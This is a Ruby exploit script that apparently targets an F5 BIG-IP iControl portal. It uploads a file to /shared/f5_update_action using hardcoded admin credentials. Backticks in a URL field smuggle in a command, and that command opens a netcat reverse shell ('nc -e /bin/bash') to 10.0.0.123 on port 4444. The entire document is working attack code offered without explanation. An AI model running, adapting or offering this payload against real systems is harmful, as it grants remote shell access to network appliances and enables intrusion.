require 'httparty'
require 'base64'

TARGET_URL = 'https://10.0.0.136/iControl/iControlPortal.cgi'
TARGET_FILE = "/shared/f5_update_action"
PAYLOAD = "nc -e /bin/bash 10.0.0.123 4444 2>&1 > /dev/null &"
DELAY = 1000

FULL_PAYLOAD = [
  "AAA",
  "https://localhost/success`#{ PAYLOAD }`",
  "https://localhost/success`#{ PAYLOAD }`",
  0,
  0,
  0,
  0,
].join("\n")


puts HTTParty.post(
  TARGET_URL,
  verify: false,
  headers: {
    authorization: Base64::encode64('admin:iagotestbigip'),
    'content-type': 'text/xml',
  },
  body: File.read('upload_file.xml')
    .gsub('%%%FILENAME%%%', TARGET_FILE)
    .gsub('%%%PAYLOAD%%%',  Base64::encode64(FULL_PAYLOAD))
)
